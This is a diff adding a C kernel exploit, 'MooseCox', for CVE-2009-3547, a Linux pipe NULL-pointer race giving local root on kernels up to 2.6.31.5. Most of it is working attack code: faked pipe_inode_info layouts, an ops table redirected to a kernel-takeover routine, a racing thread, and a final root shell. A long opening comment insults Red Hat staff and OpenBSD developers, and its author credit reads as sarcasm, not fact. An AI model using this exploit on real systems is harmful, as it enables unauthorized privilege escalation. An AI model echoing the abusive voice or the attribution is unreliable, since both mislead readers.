@@ -1,0 +1,468 @@
+/* exp_moosecox.c
+   Watch a video of the exploit here:
+   http://www.youtube.com/watch?v=jt81NvaOj5Y
+
+   developed entirely by Ingo Molnar (exploit writer extraordinaire!) , 
+   thanks to Fotis Loukos for pointing the bug out to me -- neat bug! :)
+
+   dedicated to the Red Hat employees who get paid to copy+paste my 
+   twitter and issue security advisories, their sweet 
+   acknowledgement policy, and general classiness
+   see: https://bugzilla.redhat.com/show_activity.cgi?id=530490
+
+   "policy" aside, there's a word for what you guys are doing: "plagiarism"
+   in fact, i tested this one day by posting three links to twitter,
+   without any discussion on any of them.  the same day, those three
+   (and only those three) links were assigned CVEs, even though two of 
+   them weren't even security bugs (it doesn't pay to copy+paste)
+
+   official Ingo Molnar (that's me) policy for acknowledgement in 
+   exploits requires general douche-ness or plagiarization
+   official policy further dictates immediate exploit release for
+   embargoed, patched bug
+
+   I'll be curious to see what the CVE statistics are like for the 
+   kernel this year when they get compiled next year -- I'm predicting 
+   that when someone's watching the sleepy watchers, a more personal 
+   interest is taken in doing the job that you're paid to do correctly.
+
+   --------------------------------------------------------------------
+
+   Special PS note to Theo (I can do this here because I know he'll 
+   never read it -- the guy is apparently oblivious to the entire world of 
+   security around him -- the same world that invents the protections 
+   years before him that he pats himself on the back for "innovating")
+   Seriously though, it's incredible to me that an entire team 
+   of developers whose sole purpose is to develop a secure operating 
+   system can be so oblivious to the rest of the world.  They haven't 
+   innovated since they replaced exploitable string copies with 
+   exploitable string truncations 6 or so years ago.
+
+   The entire joke of a thread can be read here:
+   http://www.pubbs.net/openbsd/200911/4582/
+   "Our focus therefore is always on finding innovative ideas which make 
+    bugs very hard to exploit succesfully."
+   "He's too busy watching monkey porn instead of
+    building researching last-year's security technology that will stop 
+    an exploit technique that has been exploited multiple times."
+   "it seems that everyone else is slowly coming around to the
+    same solution."
+
+   So let's talk about this "innovation" of theirs with their 
+   implementation of mmap_min_addr:
+
+   They implemented it in 2008, a year after Linux implemented it, a 
+   year after the public phrack article on the bug class, more than a 
+   year after my mail to dailydave with the first public Linux kernel 
+   exploit for the bug class, and over two years after UDEREF was 
+   implemented in PaX (providing complete protection against the smaller 
+   subset of null ptr dereference bugs and the larger class of invalid 
+   userland access in general).
+
+   OpenBSD had a public null pointer dereference exploit (agp_ioctl()) 
+   published for its OS in January of 2007.  It took them over a year 
+   and a half to implement the same feature that was implemented in 
+   Linux a few months after my public exploit in 2007.
+
+   So how can it be that "everyone else is slowly coming around to the 
+   same solution"  when "everyone else" came to that solution over a 
+   year before you Theo?  In fact, I prediced this exact situation would 
+   happen back in 2007 in my DD post:
+   http://lists.virus.org/dailydave-0703/msg00011.html
+   "Expect OpenBSD to independently invent a protection against null ptr 
+    deref bugs sometime in 2009."
+
+   Let's talk about some more "innovation" -- position independent 
+   executables.  PaX implemented position independent executables on 
+   Linux back in 2001 (ET_DYN).  PIE binary support was added to GNU 
+   binutils in 2003.  Those OpenBSD innovators implemented PIE binaries 
+   in 2008, 7 years after PaX.  Innovation indeed!
+
+   How about their W^X/ASLR innovation?  These plagiarists have the 
+   audacity to announce on their press page:
+   http://www.openbsd.org/press.html
+   "Microsoft borrows one of OpenBSD's security features for Vista, 
+    stack/library randomization, under the name Address Space Layout 
+    Randomization (ASLR).  "Until now, the feature has been most 
+    prominently used in the OpenBSD Unix variant and the PaX and Exec 
+    Shield security patches for Linux""
+   Borrowing one of your features?  Where'd this ASLR acronym come from 
+   anyway?  Oh that's right, PaX again -- when they published the first 
+   design and implementation of it, and coined the term, in July 2001.
+   It covered the heap, mmap, and stack areas.
+   OpenBSD implemented "stack-gap randomization" in 2003.  Way to 
+   innovate!
+
+   W^X, which is a horrible name as OpenBSD doesn't even enforce it with 
+   mprotect restrictions like PaX did from the beginning or even SELinux 
+   is doing now (from a 3rd party contribution modeled after PaX): 
+   PaX implemented true per-page non-executable page support, protecting 
+   binary data, the heap, and the stack, back in 2000.
+   OpenBSD implemented it in 2003, requiring a full userland rebuild.
+   The innovation is overwhelming!
+
+   They keep coming up with the same exact "innovations" others came up 
+   with years before them.  Their official explanation for where they 
+   got the W^X/ASLR ideas was a drunk guy came into their tent at one of 
+   their hack-a-thons and started talking about the idea.  They had 
+   never heard of PaX when we asked them in 2003.  Which makes the 
+   following involuntarily contributed private ICB logs from Phrack #66
+   (Internet Citizen's Band -- OpenBSD internal chat network) so intriguing:
+
+   On some sunny day in July 2002 (t: Theo de Raadt):
+   <cloder> why can't you just randomize the base
+   <cloder> that's what PaX does
+   <t> You've not been paying attention to what art's saying, or you don't 
+    understand yet, either case is one of think it through yourself.
+   <cloder> whatever
+
+   Only to see poetic justice in August 2003 (ttt: Theo again):
+
+   <miod> more exactly, we heard of pax when they started bitching
+   <ttt> miod, that was very well spoken.
+
+   That wraps up our OpenBSD history lesson, in case anyone forgot it.
+   PS -- enjoy that null ptr deref exploit just released for OpenBSD.
+
+   --------------------------------------------------------------------
+
+   Important final exploit notes:
+
+   don't forget to inspect /boot/config* to see if PREEMPT, LOCKBREAK,
+   or DEBUG_SPINLOCK are enabled and modify the structures below 
+   accordingly -- a fancier exploit would do this automatically
+
+   I've broken the 2.4->2.6.10 version of the exploit and would like to see 
+   someone fix it ;)  See below for more comments on this.
+*/
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sched.h>
+#include <signal.h>
+#include <sys/syscall.h>
+#include <sys/utsname.h>
+#include "exp_framework.h"
+
+int pipefd[2];
+struct exploit_state *exp_state;
+int is_old_kernel = 0;
+
+int go_go_speed_racer(void *unused)
+{
+	int ret;
+
+        while(!exp_state->got_ring0) {
+		/* bust spinlock */
+		*(unsigned int *)NULL = is_old_kernel ? 0 : 1;
+                ret = pipe(pipefd);
+		if (!ret) {
+                	close(pipefd[0]);
+                	close(pipefd[1]);
+		}
+        }
+
+	return 0;
+}
+
+/* <3 twiz/sgrakkyu */
+int start_thread(int (*f)(void *), void *arg)
+{
+        char *stack = malloc(0x4000);
+        int tid = clone(f, stack + 0x4000 - sizeof(unsigned long), CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_VM, arg);
+        if (tid < 0) {
+                printf("can't create thread\n");
+                exit(1);
+        }
+	sleep(1);
+        return tid;
+}
+
+char *desc = "MooseCox: Linux <= 2.6.31.5 pipe local root";
+char *cve = "CVE-2009-3547";
+
+#define PIPE_BUFFERS 16
+
+/* this changes on older kernels, but it doesn't matter to our method */
+struct pipe_buf_operations {
+	int can_merge;
+	void *map;
+	void *unmap;
+	void *confirm;
+	void *release;
+	void *steal;
+	void *get;
+};
+
+struct pipe_buffer2620ornewer {
+	void *page;
+	unsigned int offset, len;
+	void *ops;
+	unsigned int flags;
+	unsigned long private;
+};
+
+struct pipe_buffer2619orolder {
+	void *page;
+	unsigned int offset, len;
+	void *ops;
+	unsigned int flags;
+};
+
+struct pipe_buffer2616orolder {
+	void *page;
+	unsigned int offset, len;
+	void *ops;
+};
+
+struct pipe_inode_info2620ornewer {
+	unsigned int spinlock;
+	/*
+	// LOCKBREAK
+	unsigned int break_lock;
+	// DEBUG_SPINLOCK
+	unsigned int magic, owner_cpu;
+	void *owner;
+	*/
+	void *next, *prev;
+	unsigned int nrbufs, curbuf;
+	void *tmp_page;
+	unsigned int readers;
+	unsigned int writers;
+	unsigned int waiting_writers;
+	unsigned int r_counter;
+	unsigned int w_counter;
+	void *fasync_readers;
+	void *fasync_writers;
+	void *inode;
+	struct pipe_buffer2620ornewer bufs[PIPE_BUFFERS];
+};
+
+struct pipe_inode_info2619orolder {
+	unsigned int spinlock;
+	/*
+	// if PREEMPT enabled
+	unsigned int break_lock;
+	// DEBUG_SPINLOCK
+	unsigned int magic, owner_cpu;
+	void *owner;
+	*/
+	void *next, *prev;
+	unsigned int nrbufs, curbuf;
+	struct pipe_buffer2619orolder bufs[PIPE_BUFFERS];
+	void *tmp_page;
+	unsigned int start;
+	unsigned int readers;
+	unsigned int writers;
+	unsigned int waiting_writers;
+	unsigned int r_counter;
+	unsigned int w_counter;
+	void *fasync_readers;
+	void *fasync_writers;
+	void *inode;
+};
+
+struct pipe_inode_info2616orolder {
+	unsigned int spinlock;
+	/*
+	// if PREEMPT enabled
+	unsigned int break_lock;
+	// DEBUG_SPINLOCK
+	unsigned int magic, owner_cpu;
+	*/
+	void *owner;
+	void *next, *prev;
+	unsigned int nrbufs, curbuf;
+	struct pipe_buffer2616orolder bufs[PIPE_BUFFERS];
+	void *tmp_page;
+	unsigned int start;
+	unsigned int readers;
+	unsigned int writers;
+	unsigned int waiting_writers;
+	unsigned int r_counter;
+	unsigned int w_counter;
+	void *fasync_readers;
+	void *fasync_writers;
+};
+
+struct fasync_struct {
+	int magic;
+	int fa_fd;
+	struct fasync_struct *fa_next;
+	void *file;
+};
+
+struct pipe_inode_info2610orolder {
+	/* this includes 2.4 kernels */
+	unsigned long lock; // can be rw or spin
+	void *next, *prev;
+	char *base;
+	unsigned int len;
+	unsigned int start;
+	unsigned int readers;
+	unsigned int writers;
+	/* 2.4 only */
+	unsigned int waiting_readers;
+
+	unsigned int waiting_writers;
+	unsigned int r_counter;
+	unsigned int w_counter;
+	/* 2.6 only */
+	struct fasync_struct *fasync_readers;
+	struct fasync_struct *fasync_writers;
+};
+
+int prepare(unsigned char *buf)
+{	
+	struct pipe_inode_info2610orolder *info_oldest = (struct pipe_inode_info2610orolder *)buf;
+	struct pipe_inode_info2616orolder *info_older = (struct pipe_inode_info2616orolder *)buf;
+	struct pipe_inode_info2619orolder *info_old = (struct pipe_inode_info2619orolder *)buf;
+	struct pipe_inode_info2620ornewer *info_new = (struct pipe_inode_info2620ornewer *)buf;
+	struct pipe_buf_operations *ops = (struct pipe_buf_operations *)0x800;
+	int i;
+	int newver;
+	struct utsname unm;
+
+	i = uname(&unm);
+	if (i != 0) {
+		printf("unable to get kernel version\n");
+		exit(1);
+	}
+
+	if (strlen(unm.release) >= 6 && unm.release[2] == '6' && unm.release[4] >= '2' && unm.release[5] >= '0' && unm.release[5] <= '9') {
+		fprintf(stdout, " [+] Using newer pipe_inode_info layout\n");
+		newver = 3;
+	} else if (strlen(unm.release) >= 6 && unm.release[2] == '6' && unm.release[4] >= '1' && unm.release[5] >= '7' && unm.release[5] <= '9') {
+		fprintf(stdout, " [+] Using older pipe_inode_info layout\n");
+		newver = 2;
+	} else if (strlen(unm.release) >= 5 && unm.release[2] == '6') {
+		fprintf(stdout, " [+] Using older-er pipe_inode_info layout\n");
+		newver = 1;
+//	} else if (strlen(unm.release) >= 5 && unm.release[2] >= '4') {
+//		is_old_kernel = 1;
+//		newver = 0;
+	} else {
+		fprintf(stdout, " [+] This kernel is still vulnerable, but I can't be bothered to write the exploit.  Write it yourself.\n");
+		exit(1);
+	}
+
+	/* for most of these what will happen is our write will
+	   cause ops->confirm(/pin) to be called, which we've replaced
+	   with own_the_kernel
+	   for the 2.6.10->2.6.16 case it has no confirm/pin op, so what gets
+	   called instead (repeatedly) is the release op
+	*/
+	if (newver == 3) {
+		/* uncomment for DEBUG_SPINLOCK */
+		//info_new->magic = 0xdead4ead;
+		/* makes list_head empty for wake_up_common */
+		info_new->next = &info_new->next;
+		info_new->readers = 1;
+		info_new->writers = 1;
+		info_new->nrbufs = 1;
+		info_new->curbuf = 1;
+		for (i = 0; i < PIPE_BUFFERS; i++)
+			info_new->bufs[i].ops = (void *)ops;
+	} else if (newver == 2) {
+		/* uncomment for DEBUG_SPINLOCK */
+		//info_old->magic = 0xdead4ead;
+		/* makes list_head empty for wake_up_common */
+		info_old->next = &info_old->next;
+		info_old->readers = 1;
+		info_old->writers = 1;
+		info_old->nrbufs = 1;
+		info_old->curbuf = 1;
+		for (i = 0; i < PIPE_BUFFERS; i++)
+			info_old->bufs[i].ops = (void *)ops;
+	} else if (newver == 1) {
+		/* uncomment for DEBUG_SPINLOCK */
+		//info_older->magic = 0xdead4ead;
+		/* makes list_head empty for wake_up_common */
+		info_older->next = &info_older->next;
+		info_older->readers = 1;
+		info_older->writers = 1;
+		info_older->nrbufs = 1;
+		info_older->curbuf = 1;
+		/* we'll get called multiple times from free_pipe_info
+		   but it's ok because own_the_kernel handles this case
+		*/
+		for (i = 0; i < PIPE_BUFFERS; i++)
+			info_older->bufs[i].ops = (void *)ops;
+	} else {
+		/*
+		different ballgame here, instead of being able to 
+		provide a function pointer in the ops table, you 
+		control a base address used to compute the address for 
+		a copy into the kernel via copy_from_user.  The 
+		following should get you started.
+		*/
+		/* lookup symbol for writable fptr then trigger it later
+		   change the main write in the one thread to write out 
+		   pointers with the value of exp_state->exploit_kernel
+		*/
+		info_oldest->base = (char *)0xc8000000;
+		info_oldest->readers = 1;
+		info_oldest->writers = 1;
+		return 0;
+	}
+
+	ops->can_merge = 1;
+	for (i = 0; i < 16; i++)
+		((void **)&ops->map)[i] = exp_state->own_the_kernel;
+
+	return 0;
+}
+
+int requires_null_page = 1;
+
+int get_exploit_state_ptr(struct exploit_state *ptr)
+{
+	exp_state = ptr;
+	return 0;
+}
+
+int trigger(void)
+{
+        char buf[128];
+        int fd;
+	int i = 0;
+
+	/* ignore sigpipe so we don't bail out early */
+	signal(SIGPIPE, SIG_IGN);
+
+	start_thread(go_go_speed_racer, NULL);
+
+	fprintf(stdout, " [+] We'll let this go for a while if needed...\n");
+	fflush(stdout);
+
+        while (!exp_state->got_ring0 && i < 10000000) {
+		fd = pipefd[1];
+		sprintf(buf, "/proc/self/fd/%d", fd);
+		fd = open(buf, O_WRONLY | O_NONBLOCK);
+		if (fd >= 0) {
+			/* bust spinlock */
+			*(unsigned int *)NULL = is_old_kernel ? 0 : 1;
+			write(fd, ".", 1);
+			close(fd);
+		}
+		i++;
+        }
+
+	if (!exp_state->got_ring0) {
+		fprintf(stdout, " [+] Failed to trigger the vulnerability.  Is this a single processor machine with CONFIG_PREEMPT_NONE=y?\n");
+		return 0;
+	}
+
+	return 1;
+}
+
+int post(void)
+{
+//	return RUN_ROOTSHELL;
+	return FUNNY_PIC_AND_ROOTSHELL;
+}
